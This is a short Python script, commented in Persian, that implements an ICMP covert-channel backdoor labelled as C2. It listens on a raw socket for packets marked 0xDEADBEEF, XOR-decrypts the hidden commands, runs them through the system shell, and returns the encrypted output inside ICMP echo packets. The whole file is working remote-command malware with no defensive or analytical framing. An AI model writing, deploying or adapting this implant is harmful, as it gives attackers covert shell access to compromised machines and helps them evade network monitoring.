#!/usr/bin/env python3
import socket
import os
import struct
import subprocess
import time
import threading

# رمز ساده برای رمزنگاری پیام‌ها (AES را در نسخه‌ی واقعی استفاده کنید)
KEY = 0xDEADBEEF

def xor_crypt(data, key):
    return bytes([b ^ (key >> (i % 4) & 0xFF) for i, b in enumerate(data)])

def create_icmp_packet(data):
    # نوع ۸ (Echo Request)، کد ۰، چکسام ۰ (محاسبه نمی‌شود برای سادگی)
    return struct.pack("!BBHI", 8, 0, 0, 0) + data

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[-] Root privileges required for raw socket.")
        return

    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    print("[C2] Listening for ICMP commands (magic: 0xDEADBEEF)...")
    while True:
        packet, addr = sock.recvfrom(65535)
        if len(packet) < 24:
            continue

        # بررسی magic marker در ۴ بایت اول payload
        if packet[20:24] == b'\xde\xad\xbe\xef':
            cmd = xor_crypt(packet[24:], KEY).decode().strip()
            if cmd.lower() == "exit":
                break
            print(f"[C2] Received command: {cmd}")
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
            except Exception as e:
                result = str(e).encode()
            # رمزنگاری نتیجه و ارسال
            enc_result = xor_crypt(result, KEY)
            sock.sendto(create_icmp_packet(enc_result), addr)

if __name__ == "__main__":
    main()
